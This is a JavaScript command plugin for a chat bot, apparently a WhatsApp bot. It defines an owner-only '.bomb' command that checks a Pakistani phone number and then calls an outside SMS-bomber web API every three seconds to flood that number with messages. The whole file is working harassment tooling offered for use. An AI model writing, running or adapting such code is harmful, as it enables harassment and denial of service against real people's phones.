const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // Extract Number (ULTIMATE FIX)
    const cleanText = text.replace(/[^\d\s]/g, ''); // Keep only digits and spaces
    const number = cleanText.trim().split(/\s+/)[1]; // Get second part after command

    // Strict Validation
    if (!number || !number.match(/^92\d{9}$/)) {
        return reply("❌ Invalid PK number! Use: .bomb 923001234567");
    }

    // Start Bombing
    isBombing = true;
    let sent = 0;
    reply(`💣 *Bombing Started!*\nNumber: ${number}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= 10) {
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sent} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            const result = await response.text();
            console.log("API Debug:", { number, status: response.status, result });

            if (!response.ok) throw new Error(`API Error: ${response.status}`);
            sent++;
        } catch (err) {
            console.error("Bombing Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 3000);
});
